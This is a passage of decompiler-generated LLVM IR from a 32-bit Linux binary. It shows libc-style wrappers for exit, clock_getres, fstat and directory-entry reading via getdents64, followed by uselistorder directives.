  uselistorder label %dec_label_pc_805444a, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8054450(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8054450:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_8054478(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054478:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054478 = load i32, i32* @ebx, align 4
  store i32 %v0_8054478, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805448b = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805448b, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_805448b, -4095
  br i1 %tmp10, label %dec_label_pc_80544a4, label %dec_label_pc_8054498

dec_label_pc_8054498:                             ; preds = %dec_label_pc_8054478
  %v1_8054498 = call i32 @function_8052729(i32 %v0_8054478)
  %v0_805449d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805449d = sub i32 0, %v0_805449d
  %v2_805449f = inttoptr i32 %v1_8054498 to i32*
  store i32 %v1_805449d, i32* %v2_805449f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80544a8.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80544a4

dec_label_pc_80544a4:                             ; preds = %dec_label_pc_8054478, %dec_label_pc_8054498
  %v2_80544a8 = phi i32 [ %v0_8054478, %dec_label_pc_8054478 ], [ %v2_80544a8.pre, %dec_label_pc_8054498 ]
  %v0_80544a4 = phi i32 [ %v4_805448b, %dec_label_pc_8054478 ], [ -1, %dec_label_pc_8054498 ]
  %v2_80544a6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80544a6, i32* @edx, align 4
  store i32 %v2_80544a8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80544a4

; uselistorder directives
  uselistorder i32 %v4_805448b, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80544a4, { 1, 0 }
}

define i32 @function_80544aa(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80544aa:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80544aa = load i32, i32* @ebx, align 4
  store i32 %v0_80544aa, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_80544bd = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_80544bd, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_80544bd, -4095
  br i1 %tmp13, label %dec_label_pc_80544d8, label %dec_label_pc_80544ca

dec_label_pc_80544ca:                             ; preds = %dec_label_pc_80544aa
  %v1_80544ca = call i32 @function_8052729(i32 %v0_80544aa)
  %v0_80544cf = load i32, i32* @ebx, align 4
  %v1_80544cf = sub i32 0, %v0_80544cf
  %v2_80544d1 = inttoptr i32 %v1_80544ca to i32*
  store i32 %v1_80544cf, i32* %v2_80544d1, align 4
  %v2_80544f0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80544eb

dec_label_pc_80544d8:                             ; preds = %dec_label_pc_80544aa
  %v1_80544d8 = icmp eq i32 %v4_80544bd, 0
  %v1_80544da = icmp eq i1 %v1_80544d8, false
  br i1 %v1_80544da, label %dec_label_pc_80544eb, label %dec_label_pc_80544dc

dec_label_pc_80544dc:                             ; preds = %dec_label_pc_80544d8
  %v4_80544e3 = bitcast i32* %stack_var_-68 to i16*
  %v5_80544e3 = call i32 @function_80548f5(i16* %v4_80544e3, i32 %arg2, i32 %v4_80544bd, i32 %v4_80544bd)
  %v0_80544eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80544eb

dec_label_pc_80544eb:                             ; preds = %dec_label_pc_80544d8, %dec_label_pc_80544ca, %dec_label_pc_80544dc
  %v2_80544f0 = phi i32 [ %v0_80544aa, %dec_label_pc_80544d8 ], [ %v2_80544f0.pre, %dec_label_pc_80544ca ], [ %v0_80544aa, %dec_label_pc_80544dc ]
  %v0_80544eb = phi i32 [ %v4_80544bd, %dec_label_pc_80544d8 ], [ -1, %dec_label_pc_80544ca ], [ %v0_80544eb.pre, %dec_label_pc_80544dc ]
  store i32 %v2_80544f0, i32* @ebx, align 4
  ret i32 %v0_80544eb

; uselistorder directives
  uselistorder i32 %v4_80544bd, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_80544eb, { 2, 0, 1 }
}

define i32 @function_80544f2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80544f2:
  %eax.global-to-local = alloca i32, align 4
  %v0_80544f2 = load i32, i32* @edi, align 4
  %v0_80544f3 = load i32, i32* @esi, align 4
  %v0_80544f4 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_80544f9 = load i32, i32* @edx, align 4
  %v7_8054503 = inttoptr i32 %arg2 to i32*
  %v8_8054503 = call i32 @function_8054561(i32 %arg1, i32* %v7_8054503, i32 %arg3, i32 %v0_80544f9, i32 %v0_80544f4, i32 %v0_80544f3, i32 %v0_80544f2)
  store i32 %v8_8054503, i32* %eax.global-to-local, align 4
  store i32 %v8_8054503, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_8054503, 1
  br i1 %tmp24, label %dec_label_pc_805455b, label %dec_label_pc_8054511

dec_label_pc_8054511:                             ; preds = %dec_label_pc_80544f2
  %v0_8054511 = load i32, i32* @ebx, align 4
  %v2_8054511 = add i32 %v0_8054511, %v8_8054503
  store i32 %v2_8054511, i32* @edi, align 4
  %v7_80545574 = icmp ult i32 %v0_8054511, %v2_8054511
  br i1 %v7_80545574, label %dec_label_pc_8054516, label %dec_label_pc_805455b

dec_label_pc_8054516:                             ; preds = %dec_label_pc_8054511, %dec_label_pc_8054516
  %v0_8054516 = phi i32 [ %v2_8054555, %dec_label_pc_8054516 ], [ %v0_8054511, %dec_label_pc_8054511 ]
  %v1_8054516 = add i32 %v0_8054516, 8
  %v2_8054516 = inttoptr i32 %v1_8054516 to i32*
  %v3_8054516 = load i32, i32* %v2_8054516, align 4
  store i32 %v3_8054516, i32* %eax.global-to-local, align 4
  %v2_8054519 = add i32 %v0_8054516, 4
  %v3_8054519 = inttoptr i32 %v2_8054519 to i32*
  store i32 %v3_8054516, i32* %v3_8054519, align 4
  %v0_805451c = load i32, i32* @ebx, align 4
  %v1_805451c = add i32 %v0_805451c, 16
  %v2_805451c = inttoptr i32 %v1_805451c to i32*
  %v3_805451c = load i32, i32* %v2_805451c, align 4
  store i32 %v3_805451c, i32* %eax.global-to-local, align 4
  %v1_805451f = trunc i32 %v3_805451c to i16
  %v3_805451f = add i32 %v0_805451c, 8
  %v4_805451f = inttoptr i32 %v3_805451f to i16*
  store i16 %v1_805451f, i16* %v4_805451f, align 2
  %v0_8054523 = load i32, i32* @ebx, align 4
  %v1_8054523 = add i32 %v0_8054523, 18
  %v2_8054523 = inttoptr i32 %v1_8054523 to i8*
  %v3_8054523 = load i8, i8* %v2_8054523, align 1
  %v4_8054523 = zext i8 %v3_8054523 to i32
  %v5_8054523 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054523 = and i32 %v5_8054523, -256
  %v7_8054523 = or i32 %v6_8054523, %v4_8054523
  store i32 %v7_8054523, i32* %eax.global-to-local, align 4
  %v3_8054526 = add i32 %v0_8054523, 10
  %v4_8054526 = inttoptr i32 %v3_8054526 to i8*
  store i8 %v3_8054523, i8* %v4_8054526, align 1
  %v0_805452a = load i32, i32* @ebx, align 4
  %v1_805452a = add i32 %v0_805452a, 8
  %v2_805452a = inttoptr i32 %v1_805452a to i16*
  %v3_805452a = load i16, i16* %v2_805452a, align 2
  %v4_805452a = zext i16 %v3_805452a to i32
  %v1_805452e = add nsw i32 %v4_805452a, -19
  %v1_8054532 = add i32 %v0_805452a, 19
  %v1_8054536 = add i32 %v0_805452a, 11
  store i32 %v1_8054536, i32* %eax.global-to-local, align 4
  %v3_805453a = inttoptr i32 %v1_8054536 to i8*
  %v4_805453a = call i32 @function_8052753(i8* %v3_805453a, i32 %v1_8054532, i32 %v1_805452e)
  store i32 %v4_805453a, i32* %eax.global-to-local, align 4
  %v0_8054542 = load i32, i32* @ebx, align 4
  %v1_8054542 = add i32 %v0_8054542, 8
  %v2_8054542 = inttoptr i32 %v1_8054542 to i16*
  %v3_8054542 = load i16, i16* %v2_8054542, align 2
  %v4_8054542 = zext i16 %v3_8054542 to i32
  store i32 %v4_8054542, i32* %eax.global-to-local, align 4
  %v3_8054549 = inttoptr i32 %v0_8054542 to i8*
  %v4_8054549 = call i32 @function_8052753(i8* %v3_8054549, i32 %v0_8054542, i32 %v4_8054542)
  store i32 %v4_8054549, i32* %eax.global-to-local, align 4
  %v0_805454e = load i32, i32* @ebx, align 4
  %v1_805454e = add i32 %v0_805454e, 8
  %v2_805454e = inttoptr i32 %v1_805454e to i16*
  %v3_805454e = load i16, i16* %v2_805454e, align 2
  %v4_805454e = zext i16 %v3_805454e to i32
  store i32 %v4_805454e, i32* %eax.global-to-local, align 4
  %v2_8054555 = add i32 %v4_805454e, %v0_805454e
  store i32 %v2_8054555, i32* @ebx, align 4
  %v1_8054557 = load i32, i32* @edi, align 4
  %v7_8054557 = icmp ult i32 %v2_8054555, %v1_8054557
  br i1 %v7_8054557, label %dec_label_pc_8054516, label %dec_label_pc_8054557.dec_label_pc_805455b.loopexit_crit_edge

dec_label_pc_8054557.dec_label_pc_805455b.loopexit_crit_edge: ; preds = %dec_label_pc_8054516
  %v0_805455b.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805455b

dec_label_pc_805455b:                             ; preds = %dec_label_pc_8054511, %dec_label_pc_8054557.dec_label_pc_805455b.loopexit_crit_edge, %dec_label_pc_80544f2
  %v0_805455b = phi i32 [ %v8_8054503, %dec_label_pc_80544f2 ], [ %v0_805455b.pre.pre, %dec_label_pc_8054557.dec_label_pc_805455b.loopexit_crit_edge ], [ %v8_8054503, %dec_label_pc_8054511 ]
  store i32 %v0_805455b, i32* %eax.global-to-local, align 4
  store i32 %v0_80544f3, i32* @esi, align 4
  store i32 %v0_80544f2, i32* @edi, align 4
  ret i32 %v0_805455b

; uselistorder directives
  uselistorder i32 %v0_805455b, { 1, 0 }
  uselistorder i32 %v2_8054555, { 1, 2, 0 }
  uselistorder i32 %v0_8054542, { 1, 0, 2 }
  uselistorder i32 %v0_805452a, { 1, 0, 2 }
  uselistorder i32 %v0_8054516, { 1, 0 }
  uselistorder i32 %v0_8054511, { 0, 2, 1 }
  uselistorder i32 %v8_8054503, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_8052753, { 2, 3, 1, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 11, { 13, 11, 12, 18, 7, 4, 8, 5, 9, 6, 10, 0, 1, 14, 15, 16, 17, 2, 3, 19, 20 }
  uselistorder label %dec_label_pc_805455b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054516, { 1, 0 }
}

define i32 @function_8054561(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8054561:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_8054564 = load i32, i32* @edi, align 4
  %v0_8054566 = load i32, i32* @ebx, align 4
  %v15_8054567 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_8054570 = add i32 %arg3, 30
  store i32 %arg3, i32* @edx, align 4
  %v1_8054576 = and i32 %v1_8054570, -16
  %v2_8054579 = sub i32 %v15_8054567, %v1_8054576
  %v1_805457b = add i32 %v2_8054579, 15
  %v1_805457f = and i32 %v1_805457b, -16
  %v1_8054585 = inttoptr i32 %v1_805457f to %linux_dirent64*
  store i32 %v1_805457f, i32* %ecx.global-to-local, align 4
  %v2_8054587 = add i32 %v2_8054579, -4
  %v3_8054587 = inttoptr i32 %v2_8054587 to i32*
  store i32 %v0_8054566, i32* %v3_8054587, align 4
  %v0_8054588 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_805458f = call i32 @getdents64(i32 %v0_8054588, %linux_dirent64* %v1_8054585, i32 %arg3)
  store i32 %v5_805458f, i32* %eax.global-to-local, align 4
  %v0_8054591 = load i32, i32* @esp, align 4
  %v3_8054591 = add i32 %v0_8054591, 4
  %tmp41 = icmp ult i32 %v5_805458f, -4095
  br i1 %tmp41, label %dec_label_pc_80545ab, label %dec_label_pc_805459c

dec_label_pc_805459c:                             ; preds = %dec_label_pc_8054561
  %v1_805459c = call i32 @function_8052729(i32 %v5_805458f)
  store i32 %v1_805459c, i32* %eax.global-to-local, align 4
  %v4_80545a1 = sub i32 0, %v5_805458f
  store i32 %v4_80545a1, i32* @edx, align 4
  %v2_80545a7 = inttoptr i32 %v1_805459c to i32*
  store i32 %v4_80545a1, i32* %v2_80545a7, align 4
  br label %dec_label_pc_805466d

dec_label_pc_80545ab:                             ; preds = %dec_label_pc_8054561
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_805457f, i32* @ebx, align 4
  %v5_805465d = add i32 %v5_805458f, %v1_805457f
  store i32 %v5_805465d, i32* %eax.global-to-local, align 4
  %v7_805466030 = icmp ult i32 %v1_805457f, %v5_805465d
  br i1 %v7_805466030, label %dec_label_pc_80545ca.lr.ph, label %dec_label_pc_8054668

dec_label_pc_80545ca.lr.ph:                       ; preds = %dec_label_pc_80545ab
  %v5_80545d7 = add i32 %tmp14, %arg3
  br label %dec_label_pc_80545ca

dec_label_pc_80545ca:                             ; preds = %dec_label_pc_80545ca.lr.ph, %dec_label_pc_805460c
  %stack_var_-32.036 = phi i32 [ -1, %dec_label_pc_80545ca.lr.ph ], [ %v3_805460f, %dec_label_pc_805460c ]
  %stack_var_-36.035 = phi i32 [ -1, %dec_label_pc_80545ca.lr.ph ], [ %v3_805460c, %dec_label_pc_805460c ]
  %v0_805461834 = phi i32 [ %v1_805457f, %dec_label_pc_80545ca.lr.ph ], [ %v2_8054655, %dec_label_pc_805460c ]
  %v1_805461d33 = phi i32 [ %tmp14, %dec_label_pc_80545ca.lr.ph ], [ %v2_80545da, %dec_label_pc_805460c ]
  %v0_80545e432 = phi i32 [ %v3_8054591, %dec_label_pc_80545ca.lr.ph ], [ %v1_8054657, %dec_label_pc_805460c ]
  %v1_80545ca = add i32 %v0_805461834, 16
  %v2_80545ca = inttoptr i32 %v1_80545ca to i16*
  %v3_80545ca = load i16, i16* %v2_80545ca, align 2
  %v4_80545ca = zext i16 %v3_80545ca to i32
  %v1_80545ce = add nuw nsw i32 %v4_80545ca, 3
  %v1_80545d4 = and i32 %v1_80545ce, 131068
  store i32 %v1_80545d4, i32* %ecx.global-to-local, align 4
  store i32 %v5_80545d7, i32* %eax.global-to-local, align 4
  %v2_80545da = add i32 %v1_80545d4, %v1_805461d33
  %tmp42 = icmp ugt i32 %v2_80545da, %v5_80545d7
  br i1 %tmp42, label %dec_label_pc_80545e4, label %dec_label_pc_805460c

dec_label_pc_80545e4:                             ; preds = %dec_label_pc_80545ca
  %v1_80545e4 = add i32 %v0_80545e432, -4
  %v2_80545e4 = inttoptr i32 %v1_80545e4 to i32*
  store i32 0, i32* %v2_80545e4, align 4
  %v5_80545e6 = add i32 %v0_80545e432, -8
  %v6_80545e6 = inttoptr i32 %v5_80545e6 to i32*
  store i32 %stack_var_-32.036, i32* %v6_80545e6, align 4
  %v5_80545e9 = add i32 %v0_80545e432, -12
  %v6_80545e9 = inttoptr i32 %v5_80545e9 to i32*
  store i32 %stack_var_-36.035, i32* %v6_80545e9, align 4
  %v5_80545ec = add i32 %v0_80545e432, -16
  %v6_80545ec = inttoptr i32 %v5_80545ec to i32*
  store i32 %arg1, i32* %v6_80545ec, align 4
  %v1_80545ef = call i32 @function_8054777(i32 %v2_80545da)
  store i32 %v1_80545ef, i32* %eax.global-to-local, align 4
  %v0_80545f7 = load i32, i32* @esi, align 4
  %v15_80545f7 = icmp eq i32 %v0_80545f7, %tmp14
  %v1_80545fa = icmp eq i1 %v15_80545f7, false
  br i1 %v1_80545fa, label %dec_label_pc_8054668, label %dec_label_pc_80545fc

dec_label_pc_80545fc:                             ; preds = %dec_label_pc_80545e4
  %v1_80545fc = call i32 @function_8052729(i32 %v2_80545da)
  store i32 %v1_80545fc, i32* %eax.global-to-local, align 4
  %v1_8054601 = inttoptr i32 %v1_80545fc to i32*
  store i32 22, i32* %v1_8054601, align 4
  br label %dec_label_pc_805466d

dec_label_pc_805460c:                             ; preds = %dec_label_pc_80545ca
  %v1_805460c = add i32 %v0_805461834, 8
  %v2_805460c = inttoptr i32 %v1_805460c to i32*
  %v3_805460c = load i32, i32* %v2_805460c, align 4
  store i32 %v3_805460c, i32* %eax.global-to-local, align 4
  %v1_805460f = add i32 %v0_805461834, 12
  %v2_805460f = inttoptr i32 %v1_805460f to i32*
  %v3_805460f = load i32, i32* %v2_805460f, align 4
  %v1_8054618 = inttoptr i32 %v0_805461834 to i32*
  %v2_8054618 = load i32, i32* %v1_8054618, align 4
  store i32 %v2_8054618, i32* %eax.global-to-local, align 4
  %v1_805461a = add i32 %v0_805461834, 4
  %v2_805461a = inttoptr i32 %v1_805461a to i32*
  %v3_805461a = load i32, i32* %v2_805461a, align 4
  %v2_805461d = add i32 %v1_805461d33, 4
  %v3_805461d = inttoptr i32 %v2_805461d to i32*
  store i32 %v3_805461a, i32* %v3_805461d, align 4
  %v0_8054620 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054620 = load i32, i32* @esi, align 4
  %v2_8054620 = inttoptr i32 %v1_8054620 to i32*
  store i32 %v0_8054620, i32* %v2_8054620, align 4
  %v0_8054622 = load i32, i32* @ebx, align 4
  %v1_8054622 = add i32 %v0_8054622, 8
  %v2_8054622 = inttoptr i32 %v1_8054622 to i32*
  %v3_8054622 = load i32, i32* %v2_8054622, align 4
  store i32 %v3_8054622, i32* %eax.global-to-local, align 4
  %v1_8054625 = add i32 %v0_8054622, 12
  %v2_8054625 = inttoptr i32 %v1_8054625 to i32*
  %v3_8054625 = load i32, i32* %v2_8054625, align 4
  store i32 %v3_8054625, i32* @edx, align 4
  %v1_8054628 = load i32, i32* @esi, align 4
  %v2_8054628 = add i32 %v1_8054628, 12
  %v3_8054628 = inttoptr i32 %v2_8054628 to i32*
  store i32 %v3_8054625, i32* %v3_8054628, align 4
  %v0_805462b = load i32, i32* %eax.global-to-local, align 4
  %v1_805462b = load i32, i32* @esi, align 4
  %v2_805462b = add i32 %v1_805462b, 8
  %v3_805462b = inttoptr i32 %v2_805462b to i32*
  store i32 %v0_805462b, i32* %v3_805462b, align 4
  %v0_805462e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805462e = trunc i32 %v0_805462e to i16
  %v2_805462e = load i32, i32* @esi, align 4
  %v3_805462e = add i32 %v2_805462e, 16
  %v4_805462e = inttoptr i32 %v3_805462e to i16*
  store i16 %v1_805462e, i16* %v4_805462e, align 2
  %v0_8054632 = load i32, i32* @ebx, align 4
  %v1_8054632 = add i32 %v0_8054632, 18
  %v2_8054632 = inttoptr i32 %v1_8054632 to i8*
  %v3_8054632 = load i8, i8* %v2_8054632, align 1
  %v4_8054632 = zext i8 %v3_8054632 to i32
  %v5_8054632 = load i32, i32* %eax.global-to-local, align 4
  %v6_8054632 = and i32 %v5_8054632, -256
  %v7_8054632 = or i32 %v6_8054632, %v4_8054632
  store i32 %v7_8054632, i32* %eax.global-to-local, align 4
  %v2_8054635 = load i32, i32* @esi, align 4
  %v3_8054635 = add i32 %v2_8054635, 18
  %v4_8054635 = inttoptr i32 %v3_8054635 to i8*
  store i8 %v3_8054632, i8* %v4_8054635, align 1
  %v0_8054638 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054638 = load i32, i32* @esp, align 4
  %v2_8054638 = add i32 %v1_8054638, -4
  %v3_8054638 = inttoptr i32 %v2_8054638 to i32*
  store i32 %v0_8054638, i32* %v3_8054638, align 4
  %v0_8054639 = load i32, i32* @ebx, align 4
  %v1_8054639 = add i32 %v0_8054639, 16
  %v2_8054639 = inttoptr i32 %v1_8054639 to i16*
  %v3_8054639 = load i16, i16* %v2_8054639, align 2
  %v4_8054639 = zext i16 %v3_8054639 to i32
  %v1_805463d = add nsw i32 %v4_8054639, -19
  %v2_8054640 = add i32 %v1_8054638, -8
  %v3_8054640 = inttoptr i32 %v2_8054640 to i32*
  store i32 %v1_805463d, i32* %v3_8054640, align 4
  %v0_8054641 = load i32, i32* @ebx, align 4
  %v1_8054641 = add i32 %v0_8054641, 19
  %v2_8054644 = add i32 %v1_8054638, -12
  %v3_8054644 = inttoptr i32 %v2_8054644 to i32*
  store i32 %v1_8054641, i32* %v3_8054644, align 4
  %v0_8054645 = load i32, i32* @esi, align 4
  %v1_8054645 = add i32 %v0_8054645, 19
  store i32 %v1_8054645, i32* %eax.global-to-local, align 4
  %v2_8054648 = add i32 %v1_8054638, -16
  %v3_8054648 = inttoptr i32 %v2_8054648 to i32*
  store i32 %v1_8054645, i32* %v3_8054648, align 4
  %v3_8054649 = inttoptr i32 %v2_80545da to i16*
  %v4_8054649 = call i32 @function_8054972(i16* %v3_8054649, i32 %v3_805460c, i32 %v3_805460f)
  store i32 %v4_8054649, i32* %eax.global-to-local, align 4
  %v0_805464e = load i32, i32* @ebx, align 4
  %v1_805464e = add i32 %v0_805464e, 16
  %v2_805464e = inttoptr i32 %v1_805464e to i16*
  %v3_805464e = load i16, i16* %v2_805464e, align 2
  %v4_805464e = zext i16 %v3_805464e to i32
  store i32 %v2_80545da, i32* @esi, align 4
  %v2_8054655 = add i32 %v4_805464e, %v0_805464e
  store i32 %v2_8054655, i32* @ebx, align 4
  %v0_8054657 = load i32, i32* @esp, align 4
  %v1_8054657 = add i32 %v0_8054657, 16
  store i32 %v5_805465d, i32* %eax.global-to-local, align 4
  %v7_8054660 = icmp ult i32 %v2_8054655, %v5_805465d
  br i1 %v7_8054660, label %dec_label_pc_80545ca, label %dec_label_pc_8054668

dec_label_pc_8054668:                             ; preds = %dec_label_pc_80545ab, %dec_label_pc_805460c, %dec_label_pc_80545e4
  %v0_8054668 = phi i32 [ %v0_80545f7, %dec_label_pc_80545e4 ], [ %tmp14, %dec_label_pc_80545ab ], [ %v2_80545da, %dec_label_pc_805460c ]
  store i32 %v0_8054668, i32* %eax.global-to-local, align 4
  %v5_805466a = sub i32 %v0_8054668, %tmp14
  br label %dec_label_pc_805466d

dec_label_pc_805466d:                             ; preds = %dec_label_pc_80545fc, %dec_label_pc_805459c, %dec_label_pc_8054668
  %storemerge = phi i32 [ %v5_805466a, %dec_label_pc_8054668 ], [ -1, %dec_label_pc_805459c ], [ -1, %dec_label_pc_80545fc ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8054566, i32* @ebx, align 4
  store i32 %v0_8054564, i32* %edi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8054668, { 1, 0 }
  uselistorder i32 %v2_8054655, { 0, 2, 1 }
  uselistorder i32 %v3_805460f, { 1, 0 }
  uselistorder i32 %v3_805460c, { 1, 2, 0 }
  uselistorder i32 %v2_80545da, { 0, 5, 6, 1, 2, 4, 3 }
  uselistorder i32 %v0_80545e432, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805461834, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v5_805465d, { 2, 3, 0, 1 }
  uselistorder i32 %v5_805458f, { 0, 3, 2, 1, 4 }
  uselistorder i32 %tmp14, { 5, 0, 2, 1, 3, 4 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 5, 3, 0, 4 }
  uselistorder i32 (i16*, i32, i32)* @function_8054972, { 5, 2, 3, 4, 0, 1 }
  uselistorder i32 19, { 8, 9, 10, 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32 18, { 6, 7, 8, 2, 0, 1, 3, 4, 5 }
  uselistorder i32 22, { 13, 14, 5, 6, 7, 15, 3, 4, 8, 9, 10, 11, 12, 0, 1, 2 }
  uselistorder i32 -12, { 17, 37, 93, 94, 21, 22, 50, 51, 52, 53, 39, 18, 45, 48, 49, 46, 43, 20, 41, 19, 38, 47, 23, 54, 55, 44, 42, 40, 24, 56, 57, 25, 26, 58, 59, 60, 61, 62, 36, 27, 32, 29, 28, 66, 67, 0, 68, 1, 2, 86, 81, 82, 83, 33, 34, 80, 35, 84, 85, 69, 3, 4, 30, 31, 5, 70, 71, 6, 7, 72, 8, 73, 9, 10, 74, 11, 75, 12, 13, 76, 14, 77, 15, 78, 79, 63, 64, 65, 87, 88, 89, 90, 91, 16, 92 }
  uselistorder i32 -8, { 0, 8, 80, 76, 78, 77, 79, 81, 82, 22, 23, 24, 25, 26, 27, 10, 11, 17, 20, 21, 18, 15, 2, 13, 1, 9, 19, 28, 29, 30, 16, 14, 12, 3, 31, 32, 4, 33, 34, 35, 36, 37, 38, 73, 5, 58, 45, 6, 42, 43, 44, 68, 62, 63, 64, 59, 60, 61, 65, 66, 67, 46, 47, 7, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 39, 40, 41, 69, 70, 71, 72, 74, 75 }
  uselistorder i32* @esp, { 193, 194, 195, 6, 7, 8, 9, 10, 331, 332, 0, 53, 54, 55, 56, 57, 58, 59, 60, 13, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 11, 123, 15, 125, 126, 127, 106, 107, 128, 129, 130, 131, 132, 94, 95, 96, 97, 98, 43, 44, 45, 46, 47, 89, 90, 91, 92, 93, 99, 100, 102, 103, 134, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 48, 49, 50, 51, 52, 133, 78, 79, 80, 81, 82, 83, 84, 77, 85, 86, 87, 88, 101, 104, 105, 120, 121, 122, 135, 136, 137, 14, 163, 162, 138, 139, 140, 141, 142, 143, 124, 144, 145, 146, 147, 148, 149, 158, 159, 160, 150, 151, 152, 153, 154, 155, 156, 157, 12, 161, 1, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 2, 3, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 16, 213, 17, 214, 18, 215, 19, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 20, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 265, 264, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 297, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 4, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 22, 333, 334, 335, 336, 327, 328, 329, 330, 27, 337, 338, 339, 340, 26, 345, 346, 347, 348, 37, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 341, 342, 343, 344, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 28, 374, 375, 376, 38, 377, 378, 379, 380, 381, 382, 383, 385, 384, 5, 386, 387, 388, 389, 390, 391, 392, 393, 25, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 36, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 21, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 30, 29, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 31, 457, 458, 459, 460, 461, 462, 463, 32, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 33, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 34, 484, 485, 35, 486, 487, 488, 489, 490, 491, 492, 493, 494, 24, 39, 495, 496, 497, 498, 499, 500, 501, 40, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 41, 601, 602, 603, 604, 605, 606, 607, 608, 42, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 23, 626, 627, 628 }
